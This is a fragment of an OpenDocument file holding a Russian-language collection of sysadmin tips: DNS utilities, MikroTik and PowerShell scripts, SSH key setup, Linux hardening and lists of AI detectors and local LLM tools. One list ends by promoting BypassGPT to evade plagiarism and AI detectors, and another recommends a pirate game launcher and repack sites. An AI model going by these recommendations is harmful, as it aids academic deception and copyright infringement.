      <text:p text:style-name="P1"><text:span text:style-name="T5">https://github.com/m0zgen/bench-dns - Простой скрипт для тестирования загрузки DNS. Написан на языке Go;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">https://github.com/m0zgen/check-dns-servers - Проверка DNS - Дата сертификата, DNS resolve, HTTP 200;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">https://github.com/m0zgen/mac-dns - Очистка кэша DNS и настройка DNS IP сервисов - Google, Cloudflare, BLD;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">https://github.com/m0zgen/bld-lookup - Соберите все IP-адреса DNS BLD и попытайтесь разрешить целевой домен с каждым IP BLD.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1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14"><text:span text:style-name="T5">Теперь подключим сам репозиторий: echo "deb [signed-by=/usr/share/keyrings/wsdd.gpg] https://pkg.ltec.ch/public/ `lsb_release -cs` main" &gt; /etc/apt/sources.list.d/wsdd.list. Обновим список пакетов и установим нужную нам службу:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">apt update</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">apt install wsdd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Пакет будет автоматически добавлен в автозагрузку и нам останется только запустить его и проверить статус:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">systemctl start wsdd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">systemctl status wsdd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Определяем контент, созданный нейросетями. Full Pack:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Buster AI <text:s/>(https://aiinfinity.blogspot.com/p/ai-detection-busterai.html) - проверяет написан ли текст нейросетями:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Detect GPT (https://chromewebstore.google.com/detail/detectgpt-detect-chat-gpt/oadkgbgppkhoaaoepjbcnjejmkknaobg) - браузерное расширение с говорящим названием;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. GLTR AI Detection (http://gltr.io/) - еще один мощный инструмент определения текста;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. GPTZero <text:s/>(https://gptzero.me/) - не раз упомянутый мной инструмент для работы с текстом;</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">5. AI Text Classifier (https://platform.openai.com/ai-text-classifier) - определяет текст, написанный моделями ChatGPT;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. Originality (https://originality.ai/) - серьезный детектор плагиата и использования нейросетей;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">7. Illuminarty (https://illuminarty.ai/en/) - определяет картинку или текст посредством сравнительного анализа;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">8. AI or Not (https://www.aiornot.com/) - определит картинку, видео или запись голоса;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">9. Writer <text:s/>(https://writer.com/ai-content-detector/) - еще один неплохой детектор текста. написанного нейросетями:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">10. ZeroGPT <text:s/>(https://www.zerogpt.com/) - определяет текст, написанный моделями OpenAI;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">11. V7 Deepfake Detector <text:s/>(https://www.v7labs.com/news/v7-releases-deep-fake-detector-for-chrome) - определяет дипфейки, можно запросить демо версию;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">12. GPTZero Online <text:s/>(https://etedward-gptzero-main-zqgfwb.streamlit.app/) - лайт версия GPTZero;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">13. QuillBot (https://quillbot.com/ai-content-detector) - новый инструмент определения текста;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">14. Scibbr <text:s/>(https://www.scribbr.com/ai-detector/) - еще один минималистичный он-лайн детектор;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Бонус: BypassGPT (https://bypassgpt.ai/) - рерайт/антидетект ИИ на стеройдах. Поможет обойти большинство программ антиплагиата и детекта.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:global currentIP;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:local newIP [/ip address get [find interface="ether1"] address];</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:if ($newIP != $currentIP) do={</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>:put "ip address $currentIP changed to $newIP";</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>:set currentIP $newIP;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Netmask. Этот скрипт полезен, если вам нужен ip-адрес без netmask (например, чтобы использовать его в брандмауэре), а "/ip address get [id] address" возвращает ip-адрес и netmask.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:global ipaddress 10.1.101.1/24</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:for i from=( [:len $ipaddress] - 1) to=0 do={ </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s/>:if ( [:pick $ipaddress $i] = "/") do={ </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>:put [:pick $ipaddress 0 $i]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s/>} </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">/radius </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add address=3.4.5.6 comment=myRad</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">А вот скрипт, который резовлит ip-адрес, сравнит ip с настроенным и заменит, если они не равны:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/system script add name="resolver" source= {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:local resolvedIP [:resolve "server.example.com"];</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:local radiusID [/radius find comment="myRad"];</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:local currentIP [/radius get $radiusID address];</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:if ($resolvedIP != $currentIP) do={</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>/radius set $radiusID address=$resolvedIP;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>/log info "radius ip updated";</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Добавьте этот скрипт в планировщик, чтобы он выполнялся, например, каждые 5 минут:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T5">/system scheduler add name=resolveRadiusIP on-event="resolver" interval=5m</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Denyhosts (http://denyhosts.sourceforge.net/): (http://denyhosts.sourceforge.net/) инструмент для предотвращения атак на основе словаря SSH и атак методом перебора</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">5. SSHGuard (http://www.sshguard.net/): (http://www.sshguard.net/) защищает хосты от атак грубой силы, отслеживает файлы системных журналов</text:span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P2"><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1"><text:span text:style-name="T5">Gamer Starter Pack. V1:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Hydra Launcher <text:s/>(https://t.me/KladovkaPavlu/1914) - пиратский игровой лаунчер, аналог Steam. Автоматический парсер репаков игр, встроенный торрент клиент и не только;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. itch.io - это открытая торговая площадка для авторов, специализирующаяся на инди-играх;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Game Jolt <text:s/>(https://gamejolt.com/games) - вторая по популярности площадка для инди-игр;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Acid Play <text:s/>(https://acid-play.com/hottest) - <text:s/>сборник игр для олдфагов, например, Icy Tower, Chicken Invaders, Bomberman и т.д.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. MegaGame <text:s/>(https://megagames.com/) - олдовый сайт с репаками игр и различными модами;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. NexusMods (https://www.nexusmods.com/) - топовая мастерская модов для большинства популярных игр;</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T5">7. shadps4-emu (http://github.com/shadps4-emu) - эмулятор игр для PlayStation 4 на ПК. Через него можно запустить BloodBorne и не только.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">#!/bin/bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Set the maximum allowed disk space usage percentage</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">MAX=90</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Set the email address to receive alerts</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">EMAIL=user@example.com</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Set the partition to monitor (change accordingly, e.g., /dev/sda1)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PARTITION=/dev/sda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Get the current disk usage percentage and related information</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">USAGE_INFO=$(df -h "$PARTITION" | awk 'NR==2 {print $5, $1, $2, $3, $4}' | tr '\n' ' ')</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">USAGE=$(echo "$USAGE_INFO" | awk '{print int($1)}') <text:s/># Remove the percentage sign</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if [ "$USAGE" -gt "$MAX" ]; then</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5"><text:s text:c="2"/># Send an email alert with detailed disk usage information</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>echo -e "Warning: Disk space usage on $PARTITION is $USAGE%.\n\nDisk Usage Information:\n$USAGE_INFO" | \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>mail -s "Disk Space Alert on $HOSTNAME" "$EMAIL"</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">fi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Список полезных команд для работы с telnet, которые могут помочь при подключении и отладке сетевых служб. Основные команды telnet:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1) Подключение к удаленному хосту: telnet &lt;hostname&gt; &lt;port&gt;. Пример: <text:s/>telnet example.com 80. Подключается к хосту example.com на порту 80 (HTTP).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2) Закрытие соединения: Чтобы завершить сессию, используйте сочетание клавиш: Ctrl + ] (переход в режим команд). Затем введите: quit</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. help - Показывает список доступных команд telnet: telnet&gt; help</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. open - Открывает новое соединение с указанным хостом: telnet&gt; open &lt;hostname&gt; &lt;port&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. close - Закрывает текущее соединение: telnet&gt; close</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. display - Показывает текущие параметры подключения: telnet&gt; display</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. mode - Переключает режим работы telnet (например, line или `character`): telnet&gt; mode line</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">6. send - Отправляет управляющие символы (например, send escape для отправки escape-секвенции): telnet&gt; send escape</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">7. status - Показывает статус текущего соединения: telnet&gt; status</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">8. set и unset - Настраивают параметры подключения (например, установка режима эхо): telnet&gt; set echo telnet&gt; unset echo</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Примеры использования telnet:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Проверка доступности порта: Чтобы проверить, открыт ли порт на удаленном сервере: telnet &lt;hostname&gt; &lt;port&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Проверка почтового сервера (SMTP): Подключение к серверу SMTP: telnet smtp.example.com 25. Затем можно вручную ввести SMTP-команды, такие как: EHLO example.com</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Проверка DNS сервера: Можно подключиться к DNS-серверу и проверить его ответы: telnet &lt;dns-server&gt; 53</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Эти команды помогут вам <text:s/>для отладки, диагностики и проверки сетевых служб.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Powershell суточный отчет по пользователям из ActiveDirectory. Раз в сутки (через планировщик задач) скрипт опрашивает ActiveDirectory на предмет:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Всего пользователей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Сколько активных</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Сколько служебных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Сколько заблокированных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Сколько новых</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$Date = Get-Date -Format "dd MMMM yyyy HH:mm"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$AllUsers = (Get-AdUser -Filter * | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$ActiveUsers = (Get-ADUser -Filter {Enabled -eq $true} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$DisabledUsers = (Get-ADUser -Filter {Enabled -eq $false} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$StartDate = (Get-Date).AddDays(-1)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$EndDate <text:s text:c="2"/>= (Get-Date).AddDays(+1)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$Zapros = Get-ADUser -Filter * -Properties Created | Where-Object {$_.Created -gt $StartDate -and $_.Created -le $EndDate}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$NewUsers = ($Zapros).count</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$OFS = "`r`n" #`r`n`r`n</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">"$($WhoUsers = $Zapros | foreach {$_.Name })"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$NotSurname = Get-ADUser -filter "Enabled -eq '$true' -and Surname -notlike '*' -and Name -ne 'Healthmailbox'"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$NotFIO = ($NotSurname).count</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$Message = "На $Date в ActiveDirectory всего пользователей $AllUsers из них: `nАктивных: $ActiveUsers из них служебные: $NotFIO. `nЗаблокированных: $DisabledUsers. `nНовых пользователей: $NewUsers `r`n`r`n$WhoUsers"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$Message | Out-File -FilePath <text:s/>"C:\temp\$(Get-Date -Format "dd MMMM yyyy")-UsersAD.txt"</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">После выполнения получаем файлик с текущей датой в папке temp.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Запускаем ИИ локально:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">1. llama.cpp (https://github.com/ggerganov/llama.cpp) - интерфейс LLaMA на чистом С/С++, работает локально на вашем процессоре;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">2. Jan (https://github.com/janhq/jan) - альтернатива ChatGPT с открытым исходным кодом, которая на работает 100% оффлайн на вашем ПК;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. LocalAI <text:s/>(https://github.com/mudler/LocalAI) - автономный, управляемый сообществом, простой локальный API, совместимый с OpenAI, написанный на языке Go;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. ollama <text:s/>(https://github.com/ollama/ollama) - инструмент для работы с <text:s/>Llama 2 и другими крупными языковыми моделями на локальном уровне;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. LM Studio <text:s/>(https://t.me/KladovkaPavlu/1948) - софт для <text:s/>исследования, загрузки и запуска различных больших языковых моделей (LLMs);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. llamafile <text:s/>(https://github.com/Mozilla-Ocho/llamafile) - позволяет запускать различные LLM одним файлом;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">7. GPT4ALL <text:s/>(https://www.nomic.ai/gpt4all) - еще одно известное решение для запуска локального ChatGPT.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><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1"><text:span text:style-name="T5">Generating public/private rsa key pair.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter file in which to save the key (/root/.ssh/id_rsa): &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Created directory '/root/.ssh'.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter passphrase (empty for no passphrase): &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter same passphrase again: &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Your identification has been saved in /root/.ssh/id_rsa.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Your public key has been saved in /root/.ssh/id_rsa.pub.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">В ответ увидим примерно: ssh-rsa AAAAB3Nz.....ywWmpl root@server1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Теперь нужно передать публичный ключ id_rsa.pub пользователя root на server2, для этого на server1 выполняем: ssh-copy-id -i ~/.ssh/id_rsa.pub root@server2</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">PermitRootLogin yes - Вход под root по ssh разрешен.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PermitRootLogin no - Вход под root по ssh запрещен.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PermitRootLogin without-password - Вход под root по ssh разрешен только по ssh ключам.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">command="rsync" ssh-rsa AAAAB3N……. root@server2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">После изменения PermitRootLogin не забудьте перезапустить службу sshd командой: service sshd restart</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как защитить сервер Linux?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Обновление системы: Регулярно обновляйте систему и программное обеспечение:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo apt update &amp;&amp; sudo apt upgrade -y # Для Debian/Ubuntu</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo yum update -y # Для CentOS/RHEL</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Включите автоматические обновления безопасности.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Настройка брандмауэра: Используйте ufw (Uncomplicated Firewall) или firewalld для управления входящими и исходящими соединениями:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo ufw enable</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo ufw allow ssh # Разрешить SSH</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo ufw allow http # Разрешить HTTP</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo ufw allow https # Разрешить HTTPS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Запретите все неиспользуемые порты.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Установка и настройка Fail2Ban: Fail2Ban блокирует IP-адреса после нескольких неудачных попыток входа:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo apt install fail2ban <text:s/># Для Debian/Ubuntu</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo yum install fail2ban <text:s/># Для CentOS/RHEL</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Настройте конфигурацию для SSH и других сервисов.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. Отключение ненужных сервисов: Удалите или остановите неиспользуемые сервисы:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl stop service_name</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl disable service_name</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">7. Использование SELinux/AppArmor: Включите SELinux (для CentOS/RHEL) или AppArmor (для Debian/Ubuntu) для усиления безопасности:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo setenforce 1 <text:s/># Для SELinux</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">sudo systemctl enable apparmor <text:s/># Для AppArmor</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">9. Мониторинг и логирование</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Используйте инструменты мониторинга, такие как htop, nmon или Prometheus.Регулярно проверяйте логи:</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">sudo tail -f /var/log/auth.log <text:s/># Логи аутентификации</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo tail -f /var/log/syslog <text:s text:c="3"/># Системные логи</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">10. Шифрование данных: Используйте шифрование дисков (LUKS) для защиты данных; Настройте SSL/TLS для всех сервисов, работающих с данными.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">11. Аудит безопасности: Используйте инструменты для сканирования уязвимостей, такие как Lynis или OpenSCAP: sudo lynis audit system</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Libsodium: (https://github.com/jedisct1/libsodium) Легковесная, высокопроизводительная библиотека для криптографии с простым API для безопасной разработки приложений.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. PyCryptodome: (https://github.com/Legrandin/pycryptodome) Библиотека для Python, предлагающая различные криптографические алгоритмы, включая AES, DES, RSA, хэширование и многое другое.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">5. bcrypt: (https://github.com/kelektiv/node.bcrypt.js) Библиотека для Node.js и JavaScript, предназначенная для безопасного хэширования паролей с использованием алгоритма bcrypt.</text:span></text:p>
      <text:p text:style-name="P1"><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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T5">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1"><text:span text:style-name="T5">Get-ChildItem -Path $env:ProgramFiles -Recurse -Include *.exe |</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Where-Object -FilterScript {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>($_.LastWriteTime -gt '2005-10-01') -and ($_.Length -ge 1mb) -and ($_.Length -le 10mb)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Копирование файлов и папок. Копирование выполняется с помощью командлета Copy-Item. Следующая команда создает резервную копию скрипта профиля PowerShell:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if (Test-Path -Path $PROFILE) {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Copy-Item -Path $PROFILE -Destination $($PROFILE -replace 'ps1$', 'bak')</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if (Test-Path -Path $PROFILE) {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Copy-Item -Path $PROFILE -Destination $($PROFILE -replace 'ps1$', 'bak') -Force</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Вы по-прежнему можете выполнять собственные команды, такие как xcopy.exe и robocopy.exe копировать файлы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Эта команда создает пустой файл C:\temp\New Folder\file.txt: New-Item -Path 'C:\temp\New Folder\file.txt' -ItemType File</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:soft-page-break/><text:span text:style-name="T5">Если вам не нужно запрашивать каждый содержащийся элемент, укажите параметр Recurse: Remove-Item -Path C:\temp\DeleteMe -Recurse</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Основы монтирования и использования команды mount (https://hackware.ru/?p=14459#1)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Монтирование образов дисков и доступ к файлам на них (https://hackware.ru/?p=14459#2)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Таблица файловых систем /etc/fstab (https://hackware.ru/?p=14459#3)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Доступ к содержимому дисков виртуальных машин и их изменение (https://hackware.ru/?p=14459#4)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Файловая система в оперативной памяти (https://hackware.ru/?p=14459#5)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. Автоматическое монтирование и его отключение (https://hackware.ru/?p=14459#6)</text:span></text:p>
